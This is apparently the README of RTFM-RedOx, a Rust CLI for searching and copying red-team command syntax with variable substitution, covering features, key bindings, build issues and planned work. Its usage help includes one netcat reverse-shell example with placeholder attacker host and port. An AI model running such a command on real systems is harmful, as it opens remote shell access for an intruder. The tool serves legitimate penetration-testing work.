RTFM-RedOx is meant to be an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [RevShells.com](https://revshells.com/).  

## Features
- A command line interface that includes a quick search for commands and comments within the included database.  Searching on a command's comments is useful for something like mimikatz, where mimikatz isn't in the actual command syntax itself, but is referenced in the comments.  
- There is variable replacement similar to msfconsole.  Variables can be added to any command. 
- Update command syntax already in the database as well as add new commands.  
- Multiple references (typically hyperlinks) can be added to commands for things like cheatsheets, explainer videos, tutorials, whatever.  

The ultimate purpose of this is to eliminate the need to leave the terminal to open a note taking app or web browser to search for command syntax and usage, and to not have to repeatedly type in the same remote/local host ips, ports or urls since those are saved as variables within the CLI and automatically replaced in the command before it is copied to the clipboard.

I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I'm gradually adding new commands and pushing the edited db file to the repository.    

## Usage
```
Ctrl+r           Cycle through search options to dynamically find commands as you type.
                 Allows searching within commands and comments.
Ctrl+c           Copy currently selected command to clipboard.
Ctrl+u           URL-encode and then copy currently selected command to clipboard.
Crtl+h or hist   Display selectable history of already selected commands.
Ctrl+v           Paste from clipboard
info             Display info on the currently selected command.
env              Show user variables that have already been set.
set              Set a user variable e.g. set lhost 10.10.16.3
add -c           Add a command to the database e.g. 'add -c nc [LHOST] [LPORT] -e /bin/bash'
update           Update a database column in the selected command
                 e.g. comment, command, author or references
                 Example: update references http://blog.gregscharf.com
Esc              Exit current mode.
help             Display help
Ctrl+q or exit   Exit redOx.
```

![demo](./redox-demo.gif)


## To Use
```bash
#if you don't already have rust installed
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

git clone https://github.com/gregscharf/RTFM-Redox.git
cd RTFM-Redox
cargo run --release
```

## Known Issues

**Debian distributions**: The linker will fail during the build process unless the following packages are installed.
```bash
sudo apt install libxcb1-dev libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev
```

**Kali**: Sometimes the backspace/delete key requires Ctrl+Backspace/Delete to delete previous typed characters in the redox CLI. And in some cases Ctrl+h stops working, so I've added a 'hist' command for when that occurs until I figure out some of the intermittent key stroke issues. 

**Kali ARM64**: The following packages are required to successfully build
```
sudo apt install libxcb1-dev libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev
sudo apt install libssl-dev
```

**Arch**: No known issues

**Mac M1**: Screen flicker when using up/down arrows 

**Windows**: Not supported because the Termion crate does not work on windows.  I'll be switching to crossterm at some point.


## To Add
- [X] Search checks against both command and comment field via Ctrl+r toggle search mode
- [ ] Selectable list of tags to retrieve grouped commands
- [ ] Delete functionality for rows and columns in the database
    - For example, Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.  Deleting references and tags from a command will be done with 'delete tag <id>' or 'delete reference <id>'.  Ids will be displayed next to tags and references in the info for the command.    
- [ ] Add config file to persist user set variables and other as yet to be determined configurations.
    - This might be the place for related commands that are often used together. Add ability to save the commands from the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
- [ ] Left/right arrow keys to edit already typed or pasted in command.  Really only useful when typing a long command to add to or update the database.
- [ ] Add a local references option via the soon to be added config file for references to notes and scripts on the local filesystem.
- [ ] Implement [RTFM](https://github.com/leostat/rtfm)'s solution for creating/updating the database
- [ ] Switch from termion to crossterm for Windows support.

## To Fix
- [x] Add buffer to scroll through result output that doesn't fit within terminal windows.
- [x] Handle error when output exceeds terminal window so application doesn't crash on Arch.
- [ ] Sometimes backspace/delete key requires Ctrl+Backspace/Delete to delete typed character preceding cursor.
- [ ] Switch from termion to crossterm to add support for Windows consoles.      
- [ ] Switch to rusqlite and dump sqlx to avoid openssl static build nightmare to allow for release builds.

